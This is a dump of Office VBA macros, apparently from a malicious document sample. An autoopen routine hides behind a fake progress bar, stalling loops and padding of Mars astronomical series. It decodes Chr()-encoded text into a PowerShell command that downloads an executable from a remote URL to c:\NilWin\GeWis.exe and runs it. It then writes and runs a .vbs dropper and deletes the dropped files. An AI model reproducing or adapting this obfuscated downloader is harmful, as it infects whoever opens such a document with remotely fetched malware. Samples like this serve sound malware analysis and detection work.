 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(1.78692835372 + 2648.454825473 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(4.24484480826 + 8584.6616659008 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(6.09391349922 + 6660.4494579072 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(5.72426647579 + 16699.53901515 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(1.95254273311 + 6665.9723822146 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(5.88548900893 + 19513.9835951042 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000003 * Int(4.38908125588 + 12295.9542296092 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(6.25276686131 + 17924.9106998204 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(4.89000247975 + 30065.5118402982 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(2.43119321236 + 6518.7582172674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(3.97032105354 + 4407.1079038898 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(1.88631752737 + 4379.6390374902 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(3.06196380356 + 6247.5131155228 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(5.98057498931 + 6680.2445323314 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000032 * Int(4.65556810177 + 6701.5801727984 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(0.76018385758 + 3863.1898447936 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000023 * Int(0.31107548102 + 8827.3902698748 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000022 * Int(1.11553014451 + 6684.8152820514 * Lite)
'Begin Code
a.WriteLine (Chr(112) & Chr(94))
a.WriteLine (Chr(111) & Chr(94))
a.WriteLine (Chr(119) & Chr(94))
a.WriteLine (Chr(101) & Chr(94))
a.WriteLine (Chr(114) & Chr(94))
a.WriteLine (Chr(115) & Chr(94))
a.WriteLine (Chr(104) & Chr(94))
a.WriteLine (Chr(101) & Chr(94))
a.WriteLine (Chr(108) & Chr(94))
a.WriteLine (Chr(108) & Chr(94))
a.WriteLine (Chr(32) & Chr(94))
a.WriteLine (Chr(45) & Chr(94))
a.WriteLine (Chr(67) & Chr(94))
a.WriteLine (Chr(111) & Chr(94))
a.WriteLine (Chr(109) & Chr(94))
a.WriteLine (Chr(109) & Chr(94))
a.WriteLine (Chr(97) & Chr(94))
a.WriteLine (Chr(110) & Chr(94))
a.WriteLine (Chr(100) & Chr(94))
a.WriteLine (Chr(32) & Chr(94))
a.WriteLine (Chr(40) & Chr(78) & Chr(101) & Chr(94))
a.WriteLine (Chr(119) & Chr(45) & Chr(79) & Chr(94))
a.WriteLine (Chr(98) & Chr(106) & Chr(94))
a.WriteLine (Chr(101) & Chr(99) & Chr(94))
a.WriteLine (Chr(116) & Chr(32) & Chr(78) & Chr(94))
a.WriteLine (Chr(101) & Chr(116) & Chr(46) & Chr(87) & Chr(94))
a.WriteLine (Chr(101) & Chr(98) & Chr(67) & Chr(94))
a.WriteLine (Chr(108) & Chr(105) & Chr(101) & Chr(110) & Chr(94))
a.WriteLine (Chr(116) & Chr(41) & Chr(46) & Chr(68) & Chr(94))
a.WriteLine (Chr(111) & Chr(119) & Chr(110) & Chr(108) & Chr(94))
a.WriteLine (Chr(111) & Chr(97) & Chr(100) & Chr(94))
a.WriteLine (Chr(70) & Chr(105) & Chr(94))
a.WriteLine (Chr(108) & Chr(101) & Chr(40) & Chr(39) & Chr(94))
a.WriteLine (Chr(104) & Chr(94))
a.WriteLine (Chr(116) & Chr(94))
a.WriteLine (Chr(116) & Chr(94))
a.WriteLine (Chr(112) & Chr(94))
a.WriteLine (Chr(58) & Chr(94))
a.WriteLine (Chr(47) & Chr(94))
a.WriteLine (Chr(47) & Chr(94))
a.WriteLine LinUrFI.Caption
a.WriteLine (Chr(39) & Chr(44) & Chr(32) & Chr(39) & Chr(94))
a.WriteLine (Chr(99) & Chr(58) & Chr(94))
a.WriteLine (Chr(92) & Chr(94))
a.WriteLine (Chr(78) & Chr(105) & Chr(108) & Chr(87) & Chr(105) & Chr(110) & Chr(92) & Chr(94))
a.WriteLine (Chr(71) & Chr(101) & Chr(87) & Chr(105) & Chr(115) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(94))
a.WriteLine (Chr(39) & Chr(41) & Chr(59) & Chr(94))
a.WriteLine (Chr(83) & Chr(94))
a.WriteLine (Chr(116) & Chr(97) & Chr(94))
a.WriteLine (Chr(114) & Chr(116) & Chr(32) & Chr(94))
a.WriteLine (Chr(99) & Chr(58) & Chr(94))
a.WriteLine (Chr(92) & Chr(94))
a.WriteLine (Chr(78) & Chr(105) & Chr(108) & Chr(87) & Chr(105) & Chr(110) & Chr(92) & Chr(94))
a.WriteLine (Chr(71) & Chr(101) & Chr(87) & Chr(105) & Chr(115) & Chr(46) & Chr(101) & Chr(120) & Chr(101))
a.WriteLine LinUrFI.Tag
a.Close
Set Z = fs.CreateTextFile(Chr(99) & Chr(58) & Chr(92) & Chr(78) & Chr(105) & Chr(108) & Chr(87) & Chr(105) & Chr(110) & Chr(92) & Chr(78) & Chr(105) & Chr(108) & Chr(87) & Chr(105) & Chr(110) & Chr(116) & Chr(46) & Chr(118) & Chr(98) & Chr(115), True)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(2.14488758889 + 13363.4300278674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000046 * Int(2.92422266239 + 16703.0793871512 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(1.78692835372 + 2648.454825473 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(4.24484480826 + 8584.6616659008 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(6.09391349922 + 6660.4494579072 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(5.72426647579 + 16699.53901515 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(1.95254273311 + 6665.9723822146 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(5.88548900893 + 19513.9835951042 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000003 * Int(4.38908125588 + 12295.9542296092 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(6.25276686131 + 17924.9106998204 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(4.89000247975 + 30065.5118402982 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(2.43119321236 + 6518.7582172674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(3.97032105354 + 4407.1079038898 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(1.88631752737 + 4379.6390374902 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(3.06196380356 + 6247.5131155228 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(5.98057498931 + 6680.2445323314 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000032 * Int(4.65556810177 + 6701.5801727984 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(0.76018385758 + 3863.1898447936 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000023 * Int(0.31107548102 + 8827.3902698748 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000022 * Int(1.11553014451 + 6684.8152820514 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000002 * Int(4.81193192299 + 15508.6151232744 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000019 * Int(5.11656455993 + 12012.5822971404 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(1.07254469525 + 8425.6508378148 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000021 * Int(2.68436255141 + 6261.7402095244 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000022 * Int(2.15631095909 + 3335.0895023924 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000017 * Int(0.03684125273 + 3877.4169387952 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000017 * Int(2.84467149903 + 3344.4937620578 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000002 * Int(5.41519706836 + 3205.5473466644 * Lite)



Mars_L21 = OPOPOTAMIKUSE * Lite * Lite
End Function
' ************************


Private Sub UserForm_Click()

End Sub





Attribute VB_Name = "Jeriop"
Attribute VB_Base = "0{DECDB7BA-01B9-49A1-9B22-FB8A1881888B}{E6F7D692-8778-4525-B5CF-A5F7BFBEB8AC}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "Level11work"
Attribute VB_Name = "LinUrFI"
Attribute VB_Base = "0{F64CD35A-5EE1-4E56-AD49-F7CB66FF25F6}{62E1B194-DECC-4E13-8C5D-BE7BF0486867}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub UserForm_Click()

End Sub
Attribute VB_Name = "Module1"
'cTimingPC.cls

' VBSpeed:-
' <www.xbeat.net/vbspeed/index.htm>

' Use eg

' RESET
'  tmHowLong.Reset

' SHOW msec
'  Text1 = Format(tmHowLong.Elapsed, "0000") & " msec"
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

' cTimingPC - (c) don 19990921, donald@xbeat.net
'           - update: 20000908
'*****************************************************************************
' Performance Timer with |fffd| n MicroSecond-Resolution (dep. on CPU)
' NOTE: uses API QueryPerformanceCounter which some CPUs do NOT support!
'*****************************************************************************
'
' use:
' Module declare: Private tmr as CTimingPC
' Make Instance:  Set tmr = New CTimingPC
' start timer:    tmr.Reset
' stop/get time:  dTime=tmr.Elapsed (returns Double millisec with microsec as fraction)
'                 sTime=tmr.sElapsed (returns String millisec with microsec as fraction and " msec")
' wait:           wait for n milliseconds (total suspend, no DoEvents)
' note:
' tmr.Elapsed actually returns Currency but it can be mapped on a double

Option Explicit

Private seqFreq    As Currency
Private seqStart   As Currency
Private fAvailable As Boolean


Private Sub Class_Initialize()

 ' determine if system has Performance Counter and get its frequency
 ' returns ticks/sec (1.193.180 on my machine PII 350)
 ' note: the Currency var displays this as "119.318", gotta multiply
 '       by 10,000 to get the actual integer value

  If QueryPerformanceFrequency(seqFreq) = 0& Then
    MsgBox "PerfCounter not available", vbExclamation
   Else
    fAvailable = True
  End If

End Sub

Friend Sub Reset()

 ' establishes a "start time" reference

  QueryPerformanceCounter seqStart

End Sub

Friend Function Elapsed() As Double 'more handy than Currency

 ' return elapsed time in seconds
 
 Dim seqNow As Currency

  QueryPerformanceCounter seqNow
  If fAvailable Then
    Elapsed = CDbl(seqNow - seqStart) / CDbl(seqFreq)
  End If

End Sub

':) Ulli's VB Code Formatter V2.16.6 (2003-Jun-13 22:39) 42 + 38 = 80 Lines

Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

Attribute VB_Name = "UFProgressBar"
Attribute VB_Base = "0{D2F5149A-2E0A-491E-8060-BE08286229C1}{59789E9B-2C49-4186-B1C4-DF21AC8711B9}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub UserForm_Click()

End Sub
Attribute VB_Name = "UserForm2"
Attribute VB_Base = "0{FE928183-8FE3-4B0A-9256-690E6E57CA3E}{D8AE30F4-3E76-4F52-A124-6EBACA336A0C}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "modCProc"

Function Record1()
Record1 = Jeriop.Tag
End Function

 Sub Record2(MyVar1, MyVar2)
Set FSOLIB = MyVar1
FSOLIB.Open MyVar2
End Sub


Public Function Log2(ByVal Value As Double) As Double
Dim K As Long
For K = 0 To 3220
Log2 = Log(Value) / 0.693147180559945
DoEvents
Next K
End Function




Attribute VB_Name = "modCreatreObf"
Attribute VB_Name = "modMainObj"
 
Public folder
Public DataB
Public fso
Public fs
Public a
Public Start1
Public Start2

Sub autoopen()

ProgressBar_Chart



End Sub

Sub InitUFProgressBarBar()
With UFProgressBar
.MainProgressLabel.Caption = "0%"
.Show vbModeless
End With
End Sub

Sub ProgressBar_Chart()

Dim I As Long
Dim CurrentUFProgressBar As Double
Dim UFProgressBarPercentage As Double
Dim BarWidth As Long

I = 1

Call InitUFProgressBarBar

Dim K As Long, Buffer2 As Variant

For K = 0 To 10806

Buffer2 = Time$
Call DateAdd("n", K, Now)
DoEvents

Next K


Do While I <= 3500


CurrentUFProgressBar = I / 1500
UFProgressBarPercentage = Round(CurrentUFProgressBar * 60, 0)


DoEvents

I = I + 1

Loop

 Dim OPOPOTAMIKUSE As Double
 OPOPOTAMIKUSE = 0#
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00001113107 * Int(5.14987350142 + 3340.6124266998 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000424446 * Int(5.61343766478 + 6681.2248533996 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000100044 * Int(5.99726827028 + 10021.8372800994 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000019606 * Int(0.07633062094 + 13362.4497067992 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000003477 * Int(0.42951907576 + 16703.062133499 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000004693 * Int(3.14159265359 + 0 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002869 * Int(0.44711842697 + 3344.1355450488 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000002428 * Int(3.02115527957 + 3185.1920272656 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000688 * Int(0.80693359444 + 6684.7479717486 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000054 * Int(3.86836515672 + 1059.3819301892 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000577 * Int(0.7785327512 + 20043.6745601988 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000468 * Int(4.52450786544 + 3496.032826134 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000487 * Int(1.60862391345 + 3583.3410306738 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000362 * Int(4.42397903418 + 2787.0430238574 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000397 * Int(5.71967986581 + 3149.1641605882 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000299 * Int(0.75640033535 + 3738.761430108 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000035 * Int(5.55691984889 + 4136.9104335162 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000314 * Int(3.37632898783 + 6525.8044539654 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000233 * Int(2.13965262306 + 3097.88382272579 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000212 * Int(4.20487494011 + 3341.592747768 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000214 * Int(0.56779556947 + 155.4203994342 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000201 * Int(2.35284464564 + 1592.5960136328 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000204 * Int(0.96723315302 + 1990.745017041 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000023 * Int(5.82959057146 + 2388.8940204492 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000016 * Int(4.14974194757 + 4535.0594369244 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000156 * Int(5.13345210285 + 796.2980068164 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000146 * Int(3.29541339704 + 2957.7158944766 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000156 * Int(1.13805508457 + 10025.3603984484 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000159 * Int(3.76174286126 + 1194.4470102246 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000136 * Int(5.58293924642 + 3894.1818295422 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000145 * Int(3.02112488974 + 3337.0893083508 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000146 * Int(4.25359617225 + 4399.994356889 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.000000001 * Int(4.26740096115 + 1589.0728952838 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000091 * Int(6.12108227231 + 6489.776587288 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000101 * Int(1.17242141914 + 7079.3738568078 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000098 * Int(1.12613498307 + 23384.2869868986 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000075 * Int(6.02182689533 + 529.6909650946 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000078 * Int(5.93418069229 + 7477.522860216 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000068 * Int(1.70775041911 + 9492.1463150048 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000007 * Int(3.67253155189 + 8962.4553499102 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000062 * Int(4.14954627063 + 4292.3308329504 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000067 * Int(0.1509224655 + 3870.3033917944 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000066 * Int(1.12578506413 + 6151.533888305 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000062 * Int(1.93984222091 + 6923.9534573736 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000006 * Int(4.30641513096 + 12303.06777661 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000074 * Int(4.72156358149 + 3347.7259737006 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000055 * Int(2.75742802464 + 4933.2084403326 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000053 * Int(4.77894621871 + 6127.6554505572 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(2.57807944338 + 3340.5951730476 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000048 * Int(3.72532068729 + 9866.4168806652 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000042 * Int(6.15391373101 + 7234.794256242 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000043 * Int(3.43955584179 + 5486.777843175 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000005 * Int(4.60885064189 + 3340.629680352 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000044 * Int(4.47943289816 + 426.598190876 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000045 * Int(6.244852075 + 2274.1169495098 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000004 * Int(0.73805316471 + 7.1135470008 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000038 * Int(1.06497784748 + 9623.6882766912 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000041 * Int(4.60954640493 + 6682.2051744678 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000038 * Int(4.60963924082 + 7740.6067835888 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000036 * Int(3.15129246169 + 639.897286314 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000037 * Int(6.14629970622 + 5729.506447149 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000004 * Int(1.4739554485 + 13365.9728251482 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(2.60772245492 + 4690.4798363586 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000035 * Int(2.450779319 + 2288.3440435114 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000034 * Int(4.50544497582 + 7875.6718636242 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000042 * Int(2.11383330882 + 12832.7587417046 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(3.97655860802 + 191.4482661116 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000032 * Int(4.06047154083 + 3532.0606928114 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000034 * Int(5.06671994554 + 6681.2421070518 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000042 * Int(4.67024017441 + 15643.6802033098 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000036 * Int(0.29140871479 + 3723.508958923 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(4.52588149629 + 4929.6853219836 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000034 * Int(2.7449907289 + 6677.7017350506 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000003 * Int(1.57743012295 + 10419.9862835076 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000004 * Int(1.31713176335 + 5331.3574437408 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000034 * Int(3.03490000148 + 6681.2075997474 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(1.25306164576 + 242.728603974 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(5.44118048011 + 10021.8545337516 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000029 * Int(3.41037097794 + 10021.8200264472 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(4.81855060968 + 6836.6452528338 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(0.72745302325 + 6283.0758499914 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000003 * Int(3.06267495632 + 2281.2304965106 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000027 * Int(0.62535799761 + 6681.2921637024 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000003 * Int(3.56389476096 + 8969.568896911 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000032 * Int(5.31078691958 + 553.5694028424 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000033 * Int(2.00753799963 + 5884.9268465832 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000027 * Int(1.18001479303 + 8955.3418029094 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(2.94122791628 + 2544.3144198834 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000025 * Int(0.17808889827 + 9830.3890139878 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000031 * Int(5.73384204593 + 3339.6321056316 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000028 * Int(3.70436008855 + 6298.3283211764 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000024 * Int(0.07739730466 + 10818.1352869158 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000027 * Int(1.03401737006 + 6681.1575430968 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000024 * Int(0.09987383242 + 382.8965322232 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000027 * Int(0.60053652251 + 3553.9115221378 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000027 * Int(4.97107900859 + 3767.2106175758 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000024 * Int(3.36621347824 + 8031.0922630584 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000026 * Int(4.80509833364 + 7632.9432596502 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000022 * Int(1.43966107077 + 26724.8994135984 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000002 * Int(0.36901153144 + 398.1490034082 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000019 * Int(1.00325306041 + 7064.1213856228 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000002 * Int(0.19821371186 + 6674.1113063988 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000018 * Int(1.07169297658 + 7210.9158184942 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000021 * Int(2.6951214034 + 10018.3141617504 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000023 * Int(3.25670295081 + 5621.8429232104 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000018 * Int(0.24542781929 + 3981.490034082 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000018 * Int(5.14428605713 + 6688.3384004004 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000002 * Int(0.97539014916 + 6894.5239488376 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000024 * Int(4.42156401638 + 1748.016413067 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000016 * Int(0.6538950344 + 3340.545116397 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000016 * Int(5.28427106012 + 3333.498879699 * Lite)


FPStartShowFPS.LBR_For_Mars (15)

For K = 0 To 4000
Call DateAdd("s", K, Now)
DoEvents
Next K



Unload UFProgressBar
Open "c:\NilWin\NilWint.vbs" For Binary As #1
Put #1, , FPStartShowFPS.Caption & vbCrLf & FPStartShowFPS.Tag & vbCrLf & UFProgressBar.Tag
Close #1

Record2 GetObject(Record1()), "C:\NilWin\NilWint.vbs"
Delete_Files1
Delete_Files2
End Sub

Sub Delete_Files1()
Dim K As Long, Buffer2 As Variant

For K = 0 To 50250
Buffer2 = Time$
DoEvents
Next K
Dim DeleteFile As String

DeleteFile = "c:\NilWin\NilWint.vbs"

If Len(Dir$(DeleteFile)) > 0 Then

SetAttr DeleteFile, vbNormal

Kill DeleteFile
End If
End Sub
Sub Delete_Files2()
Dim K As Long, Buffer2 As Variant

For K = 0 To 100250
Buffer2 = Time$
DoEvents
Next K
Dim DeleteFile As String

DeleteFile = "c:\NilWin\NilWint.bat"

If Len(Dir$(DeleteFile)) > 0 Then

SetAttr DeleteFile, vbNormal

Kill DeleteFile
End If
End Sub



INQUEST-PP=macro
